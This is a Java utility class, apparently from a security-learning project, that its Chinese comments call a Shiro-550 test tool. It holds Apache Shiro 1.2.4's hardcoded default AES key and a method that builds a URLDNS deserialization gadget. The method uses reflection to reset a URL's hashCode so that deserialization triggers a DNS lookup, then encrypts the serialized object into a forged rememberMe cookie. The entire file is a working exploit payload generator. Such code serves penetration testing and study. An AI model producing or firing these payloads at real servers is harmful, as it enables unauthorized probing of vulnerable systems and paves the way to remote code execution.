package icu.secnotes.utils;

import org.apache.shiro.codec.Base64;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

/**
 * Shiro-550漏洞测试工具类
 * 用于生成测试payload
 */
public class Shiro550Util {

    // Shiro 1.2.4的硬编码密钥
    private static final byte[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode("kPH+bIxk5D2deZiIxcaaaA==");

    /**
     * 生成URLDNS链的payload
     */
    public static String generateURLDNSPayload(String dnsUrl) throws Exception {
        
        // **反射**
        // 创建HashMap
        HashMap<Object, Object> map = new HashMap<>();
        // 创建URL对象
        java.net.URL url = new java.net.URL(dnsUrl);
        // 反射将url对象的hashCode属性设置为非-1，避免序列化时发起DNS请求
        Field hashCodeField = java.net.URL.class.getDeclaredField("hashCode");
        hashCodeField.setAccessible(true);
        hashCodeField.set(url, 1234);  // 先设置为非-1，避免序列化时触发DNS
        // 将URL放入HashMap
        map.put(url, "dns");
        // 反射将url对象的hashCode属性改为-1，这样"反序列化"的时候才会执行hashCode方法
        hashCodeField.set(url, -1);  // 再设置为-1，让反序列化时触发DNS
        
        // **序列化**
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(map);
        oos.close();
        
        byte[] serialized = baos.toByteArray();
        
        // **生成rememberme（AES加密）**
        AesCipherService aes = new AesCipherService();
        ByteSource encrypted = aes.encrypt(serialized, DEFAULT_CIPHER_KEY_BYTES);
        
        return Base64.encodeToString(encrypted.getBytes());
    }

    /**
     * 获取硬编码密钥
     */
    public static String getDefaultKey() {
        return Base64.encodeToString(DEFAULT_CIPHER_KEY_BYTES);
    }
} 